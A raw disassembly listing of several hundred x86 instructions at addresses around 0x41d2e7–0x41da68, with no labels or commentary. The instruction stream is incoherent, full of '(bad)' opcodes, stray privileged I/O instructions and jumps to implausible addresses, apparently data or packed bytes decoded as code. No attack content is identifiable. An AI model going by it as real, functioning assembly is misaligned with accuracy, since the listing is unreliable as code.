  41d2e7:	ja     0x41d26d
  41d2e9:	mov    BYTE PTR [eax+0xf],dh
  41d2ec:	test   eax,0x187f805d
  41d2f1:	add    al,0xd6
  41d2f3:	inc    ebx
  41d2f4:	and    cl,dl
  41d2f6:	pop    es
  41d2f7:	dec    edi
  41d2f8:	(bad)  
  41d2f9:	fist   DWORD PTR [ebp+0x381d4638]
  41d2ff:	push   ebx
  41d300:	add    ebp,DWORD PTR [edi]
  41d302:	xlat   BYTE PTR ds:[ebx]
  41d303:	test   al,0x2f
  41d305:	iret   
  41d306:	push   esi
  41d307:	aad    0x64
  41d309:	or     dl,0x8d
  41d30c:	jle    0x41d301
  41d30e:	repnz cmp al,0x64
  41d311:	out    0x7,al
  41d313:	sub    eax,0xd8360b13
  41d318:	in     al,dx
  41d319:	addps  xmm2,XMMWORD PTR ds:0x294812a3
  41d320:	xchg   esp,eax
  41d321:	js     0x41d38d
  41d323:	shl    DWORD PTR [esi*2-0x7a53f19],0x9a
  41d32b:	lods   al,BYTE PTR ds:[esi]
  41d32c:	or     al,0xbd
  41d32e:	jge    0x41d33b
  41d330:	sbb    al,0xb9
  41d332:	repz push ss
  41d334:	jmp    0x8ece39ef
  41d339:	or     eax,0xa8c76499
  41d33e:	sub    bl,BYTE PTR [esi-0x29]
  41d341:	mov    ch,0x64
  41d343:	std    
  41d344:	xor    al,0x4d
  41d346:	inc    ecx
  41d347:	loopne 0x41d30a
  41d349:	iret   
  41d34a:	and    ecx,eax
  41d34c:	sub    esi,DWORD PTR [eax+0x5]
  41d34f:	mov    esi,0x6135cd57
  41d354:	pop    edi
  41d355:	xchg   DWORD PTR [edx-0x35937180],ebx
  41d35b:	imul   ecx,DWORD PTR [edi-0x7f9abe81],0xffffffb4
  41d362:	xchg   ebx,eax
  41d363:	sbb    edx,DWORD PTR [esi-0x13bb59ec]
  41d369:	ret    
  41d36a:	xor    BYTE PTR [edi-0x64],al
  41d36d:	lock mov ebp,0xce9bc566
  41d373:	mov    ds:0x9c7fccb0,eax
  41d378:	and    eax,0x7d782e73
  41d37d:	dec    ecx
  41d37e:	push   esi
  41d37f:	jmp    FWORD PTR [eax+eax*1-0x6b31ae0c]
  41d386:	addr16 ja 0x41d3ab
  41d389:	scas   al,BYTE PTR es:[edi]
  41d38a:	mov    ecx,0x8895bb72
  41d38f:	or     ebx,ebx
  41d391:	psubd  mm4,QWORD PTR [esi+ebx*1-0x66]
  41d396:	dec    esi
  41d397:	xchg   esi,eax
  41d398:	in     al,dx
  41d399:	jle    0x41d404
  41d39b:	scas   al,BYTE PTR es:[edi]
  41d39c:	sbb    al,0xe4
  41d39e:	jmp    0x41d341
  41d3a0:	dec    esp
  41d3a1:	jecxz  0x41d3fe
  41d3a3:	imul   esp,eax,0xfffffff0
  41d3a6:	scas   al,BYTE PTR es:[edi]
  41d3a7:	pop    ebp
  41d3a8:	sbb    esp,ecx
  41d3aa:	les    edi,FWORD PTR [esi]
  41d3ac:	add    al,0xaf
  41d3ae:	bnd jp 0x41d34a
  41d3b1:	sub    bh,ah
  41d3b3:	jbe    0x41d3ac
  41d3b5:	cmp    eax,0xf59b83a3
  41d3ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3bb:	iret   
  41d3bc:	jp     0x41d341
  41d3be:	sbb    esp,DWORD PTR [ebp-0x5f]
  41d3c1:	(bad)  
  41d3c2:	(bad)  
  41d3c3:	out    0x11,al
	...
  41d3d1:	call   0xbef9:0xcff14f56
  41d3d8:	jg     0x41d423
  41d3da:	push   ss
  41d3db:	jecxz  0x41d387
  41d3dd:	frstor [edx+0x4fcd38d9]
  41d3e3:	add    DWORD PTR [eax],eax
  41d3e5:	lods   al,BYTE PTR ds:[esi]
  41d3e6:	add    eax,DWORD PTR [eax]
  41d3e8:	add    BYTE PTR [ebx-0x76cd4709],al
  41d3ee:	test   DWORD PTR [eax+0x71],edi
  41d3f1:	ins    BYTE PTR es:[edi],dx
  41d3f2:	and    eax,DWORD PTR [esi+0x1bd5bd2b]
  41d3f8:	int3   
  41d3f9:	das    
  41d3fa:	or     dh,dh
  41d3fc:	pop    ds
  41d3fd:	or     DWORD PTR [edx+0x2c7c3883],edi
  41d403:	in     eax,0xc8
  41d405:	cmp    edi,ebp
  41d407:	adc    BYTE PTR [edx+0x3301287e],ch
  41d40d:	test   eax,0xb1b7c018
  41d412:	inc    ebp
  41d413:	xchg   esp,eax
  41d414:	mov    eax,ds:0xca401690
  41d419:	mov    eax,0x203519a8
  41d41e:	cld    
  41d41f:	jle    0x41d489
  41d421:	or     esp,DWORD PTR [edi-0x43]
  41d424:	pusha  
  41d425:	xor    eax,0x45cf3fb3
  41d42a:	popf   
  41d42b:	and    eax,0xa528b18c
  41d430:	mov    edx,0x17182f67
  41d435:	sub    eax,0x92fc8d25
  41d43a:	popa   
  41d43b:	push   ecx
  41d43c:	adc    edi,ebp
  41d43e:	sub    al,0x2e
  41d440:	sbb    eax,0xe3d6c68
  41d445:	into   
  41d446:	push   0x30
  41d448:	sbb    eax,DWORD PTR [edx+0x57]
  41d44b:	mul    BYTE PTR [ebx]
  41d44d:	nop
  41d44e:	test   DWORD PTR [edi],edi
  41d450:	sub    ebx,DWORD PTR [edi]
  41d452:	(bad)  
  41d453:	mov    ebx,0xd3fd3460
  41d458:	sbb    ebx,DWORD PTR [edx+0x33]
  41d45b:	jmp    0x91286837
  41d460:	mov    eax,ds:0xca48c59f
  41d465:	fmul   QWORD PTR [edx]
  41d467:	push   edi
  41d468:	addr16 inc ecx
  41d46a:	jp     0x41d41f
  41d46c:	push   esp
  41d46d:	ja     0x41d468
  41d46f:	cwde   
  41d470:	mov    esp,DWORD PTR [esi-0x4f]
  41d473:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d474:	inc    ebp
  41d475:	test   eax,0xd34b0d85
  41d47a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d47b:	mov    al,ds:0x369ca6c8
  41d480:	inc    edx
  41d481:	mov    bh,0xac
  41d483:	jmp    0x41d488
  41d485:	xchg   ebp,ebx
  41d487:	xchg   ebp,eax
  41d488:	mov    al,0x3c
  41d48a:	mov    ds,WORD PTR [ecx]
  41d48c:	sub    bl,BYTE PTR [ecx-0x50]
  41d48f:	pusha  
  41d490:	sub    al,BYTE PTR [esi+0x1fe4e8e0]
  41d496:	sbb    DWORD PTR [esi+0x226fb7c6],esp
  41d49c:	mov    ecx,0x6a1cc421
  41d4a1:	cmp    al,cl
  41d4a3:	dec    esi
  41d4a4:	push   ebp
  41d4a5:	inc    esi
  41d4a6:	enter  0x396a,0x67
  41d4aa:	cs das 
  41d4ac:	mov    ecx,0xc983992
  41d4b1:	xchg   ebx,eax
  41d4b2:	and    ch,al
  41d4b4:	cmp    al,0xf7
  41d4b6:	xchg   ebx,eax
  41d4b7:	xchg   ebx,eax
  41d4b8:	mov    ebx,0x3e3c361
  41d4bd:	sub    BYTE PTR [edi+0x5ff2011a],bh
  41d4c3:	mov    edi,0x16afec6
  41d4c8:	pop    esi
  41d4c9:	mov    DWORD PTR [ebx-0x73],ecx
  41d4cc:	punpckhbw mm0,QWORD PTR [eax-0xbdb0fe9]
  41d4d3:	jae    0x41d4a4
  41d4d5:	clc    
  41d4d6:	addr16 clc 
  41d4d8:	dec    esi
  41d4d9:	inc    edi
  41d4da:	pop    edx
  41d4db:	mov    ecx,0xfe296740
  41d4e0:	loope  0x41d4e7
  41d4e2:	xor    dl,al
  41d4e4:	xchg   DWORD PTR [esi],edx
  41d4e6:	out    dx,al
  41d4e7:	mul    DWORD PTR [esi]
  41d4e9:	out    0xf7,eax
  41d4eb:	int3   
  41d4ec:	shl    BYTE PTR [edi+0xc],1
  41d4ef:	cmp    BYTE PTR [esi],ah
  41d4f1:	sub    al,0xd7
  41d4f3:	pop    esp
  41d4f4:	mov    ds:0x65aba83e,eax
  41d4f9:	imul   ebx,DWORD PTR [edx+eax*1-0x73],0xffffff9d
  41d4fe:	pop    eax
  41d4ff:	mov    ah,0x3e
  41d501:	add    BYTE PTR [ebx],cl
  41d503:	shr    dh,0x94
  41d506:	xor    DWORD PTR ds:0xb5db51a0,ecx
  41d50c:	and    dl,al
  41d50e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d50f:	stos   BYTE PTR es:[edi],al
  41d510:	dec    ecx
  41d511:	xchg   edx,eax
  41d512:	cdq    
  41d513:	mov    esp,DWORD PTR ds:0x8ce0
  41d518:	retf   
  41d519:	mov    ds:0xbb8b0812,al
  41d51e:	je     0x41d530
  41d520:	retf   
  41d521:	pushf  
  41d522:	lds    eax,FWORD PTR [eax+0xee4f9d9]
  41d528:	and    ebx,esi
  41d52a:	outs   dx,BYTE PTR ds:[esi]
  41d52b:	rcr    BYTE PTR [eax-0x7d],cl
  41d52e:	adc    al,0x37
  41d530:	hlt    
  41d531:	jl     0x41d4f1
  41d533:	adc    dh,BYTE PTR [edi]
  41d535:	xlat   BYTE PTR ds:[ebx]
  41d536:	(bad)
  41d53a:	call   0xa2d94788
  41d53f:	repnz dec ebp
  41d541:	and    al,0x6d
  41d543:	(bad)  
  41d544:	test   DWORD PTR [ecx+0x58],0x1f85881e
  41d54b:	lods   al,BYTE PTR ds:[esi]
  41d54c:	sahf   
  41d54d:	adc    al,0xaf
  41d54f:	int    0x1e
  41d551:	dec    eax
  41d552:	mov    eax,ds:0x7d089d6
  41d557:	xchg   esp,eax
  41d558:	shr    DWORD PTR [edi+0x17],cl
  41d55b:	int    0xb1
  41d55d:	mov    al,0xe
  41d55f:	adc    bl,dl
  41d561:	cmp    DWORD PTR ds:0x63594818,edx
  41d567:	ret    
  41d568:	push   es
  41d569:	mov    ah,0x9d
  41d56b:	add    BYTE PTR [eax],bl
  41d56d:	les    edi,FWORD PTR [eax+0x3c768a96]
  41d573:	inc    esi
  41d574:	stos   DWORD PTR es:[edi],eax
  41d575:	push   0xe30c926e
  41d57a:	cmp    ebp,ebx
  41d57c:	shl    DWORD PTR [edx+0x6df4bf06],1
  41d582:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41d584:	adc    ebp,DWORD PTR fs:[ecx]
  41d587:	test   BYTE PTR [ebp-0x6a630caa],ch
  41d58d:	add    BYTE PTR [ecx],0x48
  41d590:	mov    ebx,0x7ae3676c
  41d595:	mov    ah,0x18
  41d597:	adc    esi,ecx
  41d599:	lock add eax,0xd9cd9010
  41d59f:	or     DWORD PTR [esi-0x14],edx
  41d5a2:	push   ss
  41d5a3:	fdivr  DWORD PTR [edx-0x80]
  41d5a6:	test   al,bl
  41d5a8:	xor    BYTE PTR [ebx],ah
  41d5aa:	or     eax,0xf8972180
  41d5af:	pusha  
  41d5b0:	mov    ch,0xce
  41d5b2:	les    esi,FWORD PTR [ebp+0x66]
  41d5b5:	popa   
  41d5b6:	adc    edi,DWORD PTR [ebp-0x1b]
  41d5b9:	nop
  41d5ba:	xchg   ebp,eax
  41d5bb:	inc    ecx
  41d5bc:	jb     0x41d5cf
  41d5be:	fsubr  QWORD PTR [esi+0x1e]
  41d5c1:	pop    esp
  41d5c2:	sar    BYTE PTR [ecx],1
  41d5c4:	and    eax,0xd787960a
  41d5c9:	xchg   DWORD PTR [esi+0x6549c477],edi
  41d5cf:	nop
  41d5d0:	pop    es
  41d5d1:	cmp    ebp,DWORD PTR [edx+edi*8]
  41d5d4:	lahf   
  41d5d5:	mov    ecx,0x744d63aa
  41d5da:	(bad)  
  41d5db:	aam    0xbc
  41d5dd:	xor    DWORD PTR [ebp-0xe],ebx
  41d5e0:	add    ebp,DWORD PTR [ebx+0x1b]
  41d5e3:	sub    eax,0xdb5ffefe
  41d5e8:	mov    edi,0x67beda73
  41d5ed:	or     dl,BYTE PTR [ebx+0x32]
  41d5f0:	sbb    al,0x6b
  41d5f2:	jp     0x41d641
  41d5f4:	fdiv   st,st(7)
  41d5f6:	xchg   edx,eax
  41d5f7:	into   
  41d5f8:	sub    BYTE PTR [ebx+0x1b],dl
  41d5fb:	jmp    0xb841b387
  41d600:	mov    al,ds:0x856ac4bc
  41d605:	les    esi,FWORD PTR [esi]
  41d607:	stos   DWORD PTR es:[edi],eax
  41d608:	jb     0x41d607
  41d60a:	icebp  
  41d60b:	add    eax,0xc196b865
  41d610:	mov    ecx,0x2e679276
  41d615:	cmp    ah,ch
  41d617:	pop    ebx
  41d618:	jg     0x41d623
  41d61a:	aad    0x9a
  41d61c:	sub    esi,0xffffffa7
  41d61f:	stos   DWORD PTR es:[edi],eax
  41d620:	retf   
  41d621:	jecxz  0x41d67c
  41d623:	outs   dx,BYTE PTR ds:[esi]
  41d624:	dec    ecx
  41d625:	mov    esp,ebp
  41d627:	clc    
  41d628:	cmp    DWORD PTR [edi],0xffffffb8
  41d62b:	aad    0x99
  41d62d:	dec    edi
  41d62e:	push   edx
  41d62f:	aad    0x43
  41d631:	cmp    esp,DWORD PTR [edx+ebx*2]
  41d634:	xchg   edx,eax
  41d635:	mov    bl,0x67
  41d637:	inc    esp
  41d638:	ins    BYTE PTR es:[edi],dx
  41d639:	int    0xdb
  41d63b:	jns    0x41d66e
  41d63d:	addr16 (bad) 
  41d63f:	mov    esi,0x6a0396e9
  41d644:	icebp  
  41d645:	xchg   ebx,eax
  41d646:	das    
  41d647:	loope  0x41d6c6
  41d649:	ja     0x41d6a8
  41d64b:	jmp    0x83812b70
  41d650:	or     cl,ch
  41d652:	ins    BYTE PTR es:[edi],dx
  41d653:	sub    BYTE PTR [eax],0x9f
  41d656:	data16 fwait
  41d658:	loope  0x41d6c7
  41d65a:	test   eax,0xa3725cb3
  41d65f:	pop    ebx
  41d660:	into   
  41d661:	or     eax,0x8ef1924c
  41d666:	push   es
  41d667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d668:	and    dl,ah
  41d66a:	cmp    al,0xab
  41d66c:	inc    esp
  41d66d:	adc    cl,BYTE PTR [edx+esi*4-0x29c577a0]
  41d674:	dec    ecx
  41d675:	jge    0x41d646
  41d677:	mov    ds:0x747e4176,eax
  41d67c:	mov    al,ds:0xc1fcd8f0
  41d681:	pop    esp
  41d682:	xchg   ecx,eax
  41d683:	sahf   
  41d684:	inc    esi
  41d685:	repz data16 jge 0x41d699
  41d689:	pop    ebp
  41d68a:	fistp  WORD PTR [edx+0x38118426]
  41d690:	jno    0x41d67b
  41d692:	xchg   DWORD PTR [edx+0x1bc11f38],edi
  41d698:	dec    ecx
  41d699:	pop    ds
  41d69a:	loope  0x41d61f
  41d69c:	mov    fs,esp
  41d69e:	cmp    eax,0x47a9a140
  41d6a3:	hlt    
  41d6a4:	call   0x949f7524
  41d6a9:	and    eax,0xa3fc4df4
  41d6ae:	xchg   ebx,eax
  41d6af:	(bad)  
  41d6b0:	addr16 cwde 
  41d6b2:	xchg   ebx,eax
  41d6b3:	push   edi
  41d6b4:	outs   dx,DWORD PTR ds:[esi]
  41d6b5:	iret   
  41d6b6:	mov    ch,0x89
  41d6b8:	inc    edi
  41d6b9:	test   bh,0xd7
  41d6bc:	pop    ds
  41d6bd:	aaa    
  41d6be:	loop   0x41d6fb
  41d6c0:	mov    ah,0xf5
  41d6c2:	shl    bl,1
  41d6c4:	repz loope 0x41d71a
  41d6c7:	xchg   esp,eax
  41d6c8:	sub    cl,BYTE PTR [eax+0x16]
  41d6cb:	push   0x47ba9f5e
  41d6d0:	mov    ch,0xb7
  41d6d2:	leave  
  41d6d3:	leave  
  41d6d4:	cmc    
  41d6d5:	inc    edx
  41d6d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6d7:	sub    eax,0x41d16c6c
  41d6dc:	cwde   
  41d6dd:	add    DWORD PTR [ecx-0x7715fe97],esp
  41d6e3:	fs iret 
  41d6e5:	sbb    edi,edx
  41d6e7:	xor    esi,DWORD PTR [edi]
  41d6e9:	mov    dh,0x38
  41d6eb:	ficom  WORD PTR [ebp+0x2b]
  41d6ee:	imul   ebx,DWORD PTR [eax+0x3b],0xb20fd97c
  41d6f5:	cwde   
  41d6f6:	out    dx,al
  41d6f7:	push   es
  41d6f8:	push   ecx
  41d6f9:	sbb    ebx,DWORD PTR [ebx]
  41d6fb:	ret    0x408e
  41d6fe:	pop    edi
  41d6ff:	jmp    DWORD PTR [esi]
  41d701:	sbb    edi,DWORD PTR [ebx+edi*1+0x68be8955]
  41d708:	cmp    BYTE PTR [esi-0x56105bc1],bh
  41d70e:	outs   dx,DWORD PTR ds:[esi]
  41d70f:	ins    BYTE PTR es:[edi],dx
  41d710:	aas    
  41d711:	add    al,0xfb
  41d713:	inc    eax
  41d714:	stc    
  41d715:	mov    cl,0xc0
  41d717:	fistp  DWORD PTR [ebp-0x5d1cb2e9]
  41d71d:	repz fisubr WORD PTR [ecx]
  41d720:	xor    eax,0x9e57213b
  41d725:	xor    al,BYTE PTR [ecx+0x1a40ab]
  41d72b:	ss mov eax,0x725289bf
  41d731:	jg     0x41d797
  41d733:	ja     0x41d704
  41d735:	push   0xd87c9cb0
  41d73a:	hlt    
  41d73b:	call   0x7fe590cd
  41d740:	lahf   
  41d741:	into   
  41d742:	into   
  41d743:	cmp    BYTE PTR ds:0xc9475dc9,ch
  41d749:	das    
  41d74a:	mov    ds:0x44dcc240,al
  41d74f:	jbe    0x41d790
  41d751:	xor    BYTE PTR [eax-0xf],dh
  41d754:	mov    al,0xb1
  41d756:	sbb    bh,BYTE PTR [esi+0x759b5715]
  41d75c:	mov    ebp,0x73df236a
  41d761:	xor    cl,dl
  41d763:	mov    dl,0xeb
  41d765:	xor    eax,0x32fd02a4
  41d76a:	test   dl,0x82
  41d76d:	nop
  41d76e:	xchg   ebx,eax
  41d76f:	xor    eax,0x339cd659
  41d774:	jg     0x41d78b
  41d776:	leave  
  41d777:	cmp    al,0xc2
  41d779:	cs jae 0x41d72c
  41d77c:	sbb    eax,0x12822ce4
  41d781:	add    esp,ebp
  41d783:	jp     0x41d78f
  41d785:	lock xchg esp,eax
  41d787:	add    BYTE PTR [eax],0x2
  41d78a:	enter  0x131b,0x5e
  41d78e:	mov    bl,0x7
  41d790:	cmc    
  41d791:	es pop esp
  41d793:	mov    al,bh
	...
  41d7a1:	cld    
  41d7a2:	xlat   BYTE PTR ds:[ebx]
  41d7a3:	dec    esp
  41d7a4:	call   0xd83ed318
  41d7a9:	adc    BYTE PTR [ecx+0x5a1713a2],ah
  41d7af:	cli    
  41d7b0:	push   ebp
  41d7b1:	jns    0x41d806
  41d7b3:	add    DWORD PTR [eax],eax
  41d7b5:	lods   al,BYTE PTR ds:[esi]
  41d7b6:	add    eax,DWORD PTR [eax]
  41d7b8:	add    BYTE PTR [ecx],ch
  41d7ba:	test   eax,0xef5a164e
  41d7bf:	into   
  41d7c0:	mov    ah,0x93
  41d7c2:	inc    eax
  41d7c3:	push   cs
  41d7c4:	dec    edi
  41d7c5:	out    0xa3,al
  41d7c7:	mov    bl,0x0
  41d7c9:	pop    ebx
  41d7ca:	xchg   BYTE PTR [bp+si-0x54],bl
  41d7ce:	fcomi  st,st(4)
  41d7d0:	sub    eax,0x1a93d24e
  41d7d5:	scas   al,BYTE PTR es:[edi]
  41d7d6:	jg     0x41d855
  41d7d8:	dec    ebx
  41d7d9:	jns    0x41d79e
  41d7db:	fstp   QWORD PTR [ecx]
  41d7dd:	cs xor eax,0x17faad7c
  41d7e3:	jmp    edi
  41d7e5:	mov    bh,0x7d
  41d7e7:	cmc    
  41d7e8:	adc    BYTE PTR [edx+ecx*8+0x27],bl
  41d7ec:	stos   BYTE PTR es:[edi],al
  41d7ed:	jo     0x41d849
  41d7ef:	jo     0x41d808
  41d7f1:	nop
  41d7f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7f3:	ins    DWORD PTR es:[edi],dx
  41d7f4:	pushf  
  41d7f5:	jle    0x41d861
  41d7f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7f8:	jbe    0x41d7bc
  41d7fa:	mov    ah,0x2a
  41d7fc:	js     0x41d85b
  41d7fe:	cwde   
  41d7ff:	inc    ebx
  41d800:	scas   al,BYTE PTR es:[edi]
  41d801:	sbb    dl,0xd3
  41d804:	daa    
  41d805:	es call 0x80a8:0xcdb1049c
  41d80d:	push   eax
  41d80e:	pushf  
  41d80f:	cmp    al,BYTE PTR [ebp+0x9718e5b]
  41d815:	xor    eax,0xa31498f7
  41d81a:	stos   DWORD PTR es:[edi],eax
  41d81b:	leave  
  41d81c:	mov    dh,0x20
  41d81e:	nop
  41d81f:	cmp    BYTE PTR [ebp+0x7c],cl
  41d822:	je     0x41d86d
  41d824:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d825:	add    al,0x3c
  41d827:	pop    ebp
  41d828:	outs   dx,BYTE PTR ds:[esi]
  41d829:	sbb    ecx,eax
  41d82b:	xor    ebx,DWORD PTR [esi-0x71d94e27]
  41d831:	pushf  
  41d832:	fst    st(5)
  41d834:	adc    al,0xa1
  41d836:	cwde   
  41d837:	push   eax
  41d838:	xchg   ebx,eax
  41d839:	mov    edi,cs
  41d83b:	inc    edi
  41d83c:	sbb    al,0xd6
  41d83e:	test   ch,bh
  41d840:	scas   eax,DWORD PTR es:[edi]
  41d841:	mov    DWORD PTR [ebx],ebx
  41d843:	pop    eax
  41d844:	mov    esp,0xb8389ea5
  41d849:	mov    edx,ebx
  41d84b:	xchg   ebp,eax
  41d84c:	les    ebx,FWORD PTR [edi+0x7f]
  41d84f:	std    
  41d850:	xlat   BYTE PTR ds:[ebx]
  41d851:	test   eax,0xc748d161
  41d856:	jle    0x41d82f
  41d858:	sub    DWORD PTR [ecx],ebx
  41d85a:	mov    WORD PTR [esp+ebp*4+0x411e8459],es
  41d861:	push   ebx
  41d862:	cmp    ecx,DWORD PTR [esi+0x3873c50e]
  41d868:	(bad)  
  41d869:	(bad)  
  41d86a:	icebp  
  41d86b:	xlat   BYTE PTR ds:[ebx]
  41d86c:	(bad)  
  41d86d:	and    edx,DWORD PTR [edx]
  41d86f:	add    BYTE PTR [edx+0x21],al
  41d872:	jmp    0x2ac76cd9
  41d877:	or     esp,esi
  41d879:	or     al,0xb2
  41d87b:	pop    es
  41d87c:	push   cs
  41d87d:	retf   0x4017
  41d880:	lock fdiv QWORD PTR [edi]
  41d883:	pop    ds
  41d884:	mov    ds:0x9555d404,eax
  41d889:	inc    edx
  41d88a:	shr    cl,0x47
  41d88d:	inc    esi
  41d88e:	daa    
  41d88f:	test   al,0x9
  41d891:	xchg   ecx,eax
  41d892:	sbb    eax,0x6bf29a3
  41d897:	in     al,dx
  41d898:	mov    edx,0x64f039d3
  41d89d:	pusha  
  41d89e:	lods   al,BYTE PTR ds:[esi]
  41d89f:	add    bh,dh
  41d8a1:	(bad)  
  41d8a2:	out    dx,eax
  41d8a3:	dec    esp
  41d8a4:	dec    ebp
  41d8a5:	jg     0x41d854
  41d8a7:	lock std 
  41d8a9:	shl    BYTE PTR [ebx+0x336577db],0x77
  41d8b0:	mov    bh,0x2a
  41d8b2:	aaa    
  41d8b3:	scas   al,BYTE PTR es:[edi]
  41d8b4:	loopne 0x41d8b6
  41d8b6:	pop    ds
  41d8b7:	imul   ebp,DWORD PTR [esi+0x3f8251a8],0x9
  41d8be:	push   ebx
  41d8bf:	push   ebp
  41d8c0:	fwait
  41d8c1:	and    al,ch
  41d8c3:	out    0xff,eax
  41d8c5:	mov    ds:0x9fd005f7,al
  41d8ca:	xlat   BYTE PTR ds:[ebx]
  41d8cb:	and    BYTE PTR [ecx+0x3b],dh
  41d8ce:	out    dx,eax
  41d8cf:	or     BYTE PTR [edi],bl
  41d8d1:	loop   0x41d8b1
  41d8d3:	(bad)  
  41d8d5:	rcl    DWORD PTR [ecx-0x3936774d],0x1c
  41d8dc:	add    BYTE PTR [ecx+0x68ed3c33],al
  41d8e2:	lods   al,BYTE PTR ds:[esi]
  41d8e3:	dec    esp
  41d8e4:	test   al,0x68
  41d8e6:	gs (bad) 
  41d8e8:	fisubr DWORD PTR [eax+0x4122a73b]
  41d8ee:	fcomip st,st(4)
  41d8f0:	sahf   
  41d8f1:	(bad)  
  41d8f2:	push   edx
  41d8f3:	in     al,0xa1
  41d8f5:	cmp    edi,DWORD PTR [edx-0x55]
  41d8f8:	mov    ebx,0xbc83f60e
  41d8fd:	push   esp
  41d8fe:	pop    esi
  41d8ff:	xchg   DWORD PTR [edx-0x53],ebx
  41d902:	or     BYTE PTR [ebp-0x71df2ed2],dl
  41d908:	or     edi,DWORD PTR [ebx+0x5b]
  41d90b:	cld    
  41d90c:	loope  0x41d908
  41d90e:	and    al,0xb9
  41d910:	fbstp  TBYTE PTR [esi-0x2165b7e]
  41d916:	push   ebp
  41d917:	or     cl,BYTE PTR [edx+0x3e]
  41d91a:	stc    
  41d91b:	push   ss
  41d91c:	push   edi
  41d91d:	dec    ebx
  41d91e:	lahf   
  41d91f:	pop    eax
  41d920:	jl     0x41d910
  41d922:	fld    QWORD PTR [ecx]
  41d924:	push   0x10
  41d926:	pop    esp
  41d927:	push   DWORD PTR [edx+0x51b3cf16]
  41d92d:	inc    edi
  41d92e:	cmp    al,0xd4
  41d930:	stos   BYTE PTR es:[edi],al
  41d931:	fisttp DWORD PTR [edx-0x599d28f0]
  41d937:	sbb    al,0x1c
  41d939:	xor    al,0xec
  41d93b:	adc    eax,0x2ab31b43
  41d940:	iret   
  41d941:	scas   al,BYTE PTR es:[edi]
  41d942:	popf   
  41d943:	cdq    
  41d944:	xchg   ebp,eax
  41d945:	mov    al,0x44
  41d947:	ds in  al,dx
  41d949:	mov    eax,0xcacf9af5
  41d94e:	xchg   esi,eax
  41d94f:	jge    0x41d8f7
  41d951:	aad    0xd4
  41d953:	mov    cl,0x91
  41d955:	sub    eax,0x11503d07
  41d95a:	xor    BYTE PTR [ecx-0x64],ah
  41d95d:	leave  
  41d95e:	out    0xdc,al
  41d960:	or     eax,0x376e2b56
  41d965:	xchg   BYTE PTR ds:0x7ef8affc,ch
  41d96b:	test   eax,0xcff28600
  41d970:	and    al,0x22
  41d972:	(bad)  [esi]
  41d974:	ret    
  41d975:	push   ebx
  41d976:	cmc    
  41d977:	mov    ebp,DWORD PTR [ecx-0x5a6318f0]
  41d97d:	sbb    dl,dh
  41d97f:	add    al,0x27
  41d981:	out    0xfe,eax
  41d983:	xor    eax,0x1bc5b925
  41d988:	jae    0x41d9d7
  41d98a:	mov    edx,0xa0e2de11
  41d98f:	in     eax,0x9
  41d991:	pusha  
  41d992:	fbld   TBYTE PTR [edi+0x4abefb10]
  41d998:	xor    eax,0xc187f8ff
  41d99d:	pop    ss
  41d99e:	sbb    eax,0x58271c0e
  41d9a3:	ficom  DWORD PTR [ebp+0x4f3de482]
  41d9a9:	repnz div ch
  41d9ac:	ins    DWORD PTR es:[edi],dx
  41d9ad:	fwait
  41d9ae:	sub    al,0x9c
  41d9b0:	adc    eax,0x87d71f9b
  41d9b5:	or     al,0x93
  41d9b7:	test   al,0x5e
  41d9b9:	cmp    al,BYTE PTR [eax]
  41d9bb:	sbb    eax,0x731e7f00
  41d9c0:	stc    
  41d9c1:	push   0xfffffff9
  41d9c3:	(bad)  
  41d9c4:	call   0xbda4:0x3a80a4db
  41d9cb:	add    BYTE PTR gs:[esi-0x51756d5b],ch
  41d9d2:	sub    BYTE PTR [edx-0x46],0xa6
  41d9d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9d7:	cld    
  41d9d8:	test   al,0x81
  41d9da:	xchg   edx,eax
  41d9db:	and    sp,WORD PTR [bx]
  41d9df:	in     eax,dx
  41d9e0:	jne    0x41da5f
  41d9e2:	inc    ebx
  41d9e3:	jmp    0xa06:0xd6a9e827
  41d9ea:	adc    dl,BYTE PTR [edi+eiz*1]
  41d9ed:	add    al,0xf5
  41d9ef:	arpl   WORD PTR ds:0x3b8d27a0,cx
  41d9f5:	adc    al,0x2f
  41d9f7:	cdq    
  41d9f8:	and    eax,0x1227b8fe
  41d9fd:	dec    ebp
  41d9fe:	jle    0x41d9e6
  41da00:	out    dx,eax
  41da01:	xchg   ebp,eax
  41da02:	sbb    ebx,edi
  41da04:	mov    bl,0x6c
  41da06:	fidivr WORD PTR [edi-0x51]
  41da09:	enter  0xa60a,0xc7
  41da0d:	xchg   esp,eax
  41da0e:	push   esp
  41da0f:	jo     0x41da7b
  41da11:	cmp    edi,DWORD PTR [ecx+0x126afbee]
  41da17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da18:	jns    0x41d9af
  41da1a:	pop    edx
  41da1b:	jl     0x41da41
  41da1d:	mov    ch,0xb4
  41da1f:	mov    ds:0xa35b7aa5,al
  41da24:	dec    ebp
  41da25:	dec    esp
  41da26:	pop    eax
  41da27:	cld    
  41da28:	dec    edi
  41da29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da2a:	jp     0x41d9b6
  41da2c:	lock ins DWORD PTR es:[edi],dx
  41da2e:	push   ebx
  41da2f:	(bad)
  41da33:	add    eax,0xd095c232
  41da38:	test   eax,0x59c62722
  41da3d:	fs cmp edi,edi
  41da40:	adc    edx,DWORD PTR ds:0x6ee6ea8e
  41da46:	and    al,0x87
  41da48:	das    
  41da49:	cmp    al,0xec
  41da4b:	cmp    eax,0x61b7358d
  41da50:	bound  edx,QWORD PTR [esi-0x60]
  41da53:	lods   al,BYTE PTR ds:[esi]
  41da54:	mov    esi,0xaa51e5e6
  41da59:	les    ebp,FWORD PTR [edx]
  41da5b:	lahf   
  41da5c:	pop    ds
  41da5d:	repz ret 
  41da5f:	(bad)  
  41da60:	fcomp  DWORD PTR [eax-0x3499be68]
  41da66:	lods   al,BYTE PTR ds:[esi]
  41da67:	into   
  41da68:	mov    al,0xf8
